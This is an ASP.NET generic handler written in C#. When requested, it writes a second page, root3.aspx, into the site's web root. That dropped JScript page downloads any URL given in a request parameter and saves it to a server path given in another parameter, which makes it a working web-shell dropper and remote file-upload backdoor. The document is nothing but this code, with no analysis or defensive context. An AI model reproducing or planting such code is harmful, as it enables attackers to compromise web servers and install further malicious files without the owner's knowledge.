<%@ WebHandler Language="C#" Class="Handler" %>
using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
    public void ProcessRequest (HttpContext context) { 
        context.Response.ContentType = "text/plain"; 
        string show="<% @Page Language=\"Jscript\"%"+"><%var e:Exception; try{var X=new ActiveXObject(\"Microsoft.XMLHTTP\");var S=new ActiveXObject(\"Adodb.Stream\");S.Type=1;S.Mode=3;S.Open();X.Open(\"GET\",Request.Item[\"url\"],false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(Server.MapPath(Request.Item[\"filename\"]),2);S.close;S=null;X=null;}catch(e){Response.Write(e.message);}%>"; 
        StreamWriter file1= File.CreateText(context.Server.MapPath("root3.aspx")); 
        file1.Write(show); 
        file1.Flush(); 
        file1.Close(); 
    } 
    public bool IsReusable { 
        get { 
            return false; 
        } 
    } 
} 